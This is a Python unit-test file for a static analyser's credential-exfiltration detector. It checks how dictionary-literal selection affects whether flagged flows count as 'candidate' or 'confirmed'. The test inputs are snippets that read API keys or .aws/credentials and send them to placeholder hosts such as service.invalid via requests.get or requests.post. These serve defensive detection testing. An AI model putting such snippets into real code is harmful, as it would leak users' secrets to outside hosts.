"""Literal dictionary selection keeps unrelated values out of the selected field."""

import unittest
from test_qindun_certify import MODULE


class PythonLiteralMappingSelectionTests(unittest.TestCase):
    def dispositions(self, source):
        hits, error = MODULE._python_flow_findings("main.py", source)
        self.assertIsNone(error)
        return {h.disposition for h in hits if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"}

    def test_selected_values_and_get_defaults(self):
        prefix = 'import os,requests\nkey=os.getenv("API_KEY")\nother=os.getenv("OTHER_SECRET")\n'
        expressions = [
            ('{"key":key,"public":"hello"}["public"]', None),
            ('{"key":key,"bulk":[other]}["key"]', "candidate"),
            ('{"key":key,"bulk":open(".aws/credentials").read()}["key"]', "candidate"),
            ('{"key":key,"public":"hello"}.get("public")', None),
            ('{"key":"public"}.get("key",other)', None),
            ('{}.get("key",key)', "candidate"),
            ('{"other":other}.get("missing")', None),
            ('{"key":key,"key":"public"}["key"]', None),
            ('{"key":"public","key":key}["key"]', "candidate"),
            ('{"key":key,"key":"public"}.get("key",other)', None),
            ('{"outer":{"key":key,"bulk":[other]}}["outer"]["key"]', "candidate"),
            ('{"outer":{"key":key,"public":"hello"}}.get("outer").get("public")', None),
            ('{"key":[key],"public":"hello"}["key"]', "confirmed"),
            (
                '{"key":open(".aws/credentials").read(),"public":"hello"}["key"]',
                "confirmed",
            ),
            ('{"key":key,"public":"hello"}["key"]', "candidate"),
        ]
        sinks = [
            'requests.get(f"https://service.invalid/?key={value}")',
            'requests.get("https://service.invalid/?key={}".format(value))',
            'requests.get("https://service.invalid",params={"key":value})',
            'requests.get("https://service.invalid",headers={"X-API-Key":value})',
        ]
        for expression, expected in expressions:
            for sink in sinks:
                for wrapped in (False, True):
                    with self.subTest(expression=expression, sink=sink, wrapped=wrapped):
                        binding = f"value={expression}\n"
                        if wrapped:
                            binding = f"def selected(key,other):\n    return {expression}\nvalue=selected(key,other)\n"
                        self.assertEqual(
                            self.dispositions(prefix + binding + sink + "\n"),
                            {expected} if expected else set(),
                        )

    def test_secret_output_and_independent_sink_still_reported(self):
        source = (
            'import os,requests\nkey=os.getenv("API_KEY")\n'
            'value={"key":key,"public":"hello"}["public"]\n'
            'requests.post("https://service.invalid",data=value)\n'
            'requests.post("https://other.invalid",data={"key":key}["key"])\n'
            'print({"key":key}["key"])\n'
        )
        hits, error = MODULE._python_flow_findings("main.py", source)
        self.assertIsNone(error)
        self.assertEqual(
            {h.disposition for h in hits if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"},
            {"confirmed"},
        )
        self.assertTrue(any(h.rule_id == "QINDUN.D5.CREDENTIAL_OUTPUT" for h in hits))

    def test_unselected_expression_is_still_visited_for_side_effects(self):
        prefix = 'import os,requests\nkey=os.getenv("API_KEY")\n'
        for expression in (
            '{"public":"hello","effect":requests.post("https://other.invalid",data=key)}["public"]',
            '{"public":"hello"}.get("public",requests.post("https://other.invalid",data=key))',
            '{"key":requests.post("https://other.invalid",data=key),"key":"public"}["key"]',
        ):
            with self.subTest(expression=expression):
                self.assertEqual(self.dispositions(prefix + f"value={expression}\n"), {"confirmed"})

    def test_dynamic_and_expanded_maps_keep_conservative_provenance(self):
        prefix = 'import os,requests\nkey=os.getenv("API_KEY")\n'
        for expression in (
            '{"key":key}[field]',
            '{"key":key}.get(field)',
            '{"key":key,**extra}["public"]',
            '{"key":key,field:"public"}["public"]',
            '{"key":key}.get(*fields)',
        ):
            with self.subTest(expression=expression):
                source = (
                    prefix
                    + f'value={expression}\nrequests.post("https://service.invalid",data=value)\n'
                )
                self.assertIn("confirmed", self.dispositions(source))
